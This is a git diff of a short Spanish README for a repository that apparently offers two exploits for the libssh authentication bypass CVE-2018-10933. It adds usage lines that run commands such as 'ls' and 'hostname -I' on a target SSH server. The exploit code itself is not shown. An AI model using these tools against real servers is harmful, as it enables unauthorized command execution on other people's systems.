@@ -1,6 +1,18 @@
 # libssh
 
-Ejecucion de comandos libssh CVE-2018-10933
+Ejecucion de comandos 
+libssh 
+CVE-2018-10933 
+(Ambos exploits cumplen la misma funcion - ya va en gusto usar el que desee)
+
+# Exploit 1
+
+![exploit-libssh](https://user-images.githubusercontent.com/67207446/235363870-a5953fcf-072e-4c78-92fe-734cd9442c96.png)
+
+python3 script_name.py 192.168.1.10 22 ls
+python3 script_name.py 192.168.1.10 22 "hostname -I"
+
+# Exploit 2
 
 ![image](https://user-images.githubusercontent.com/67207446/235362690-e590b25f-2a75-48f8-afa9-caf0bf4818d3.png)
 
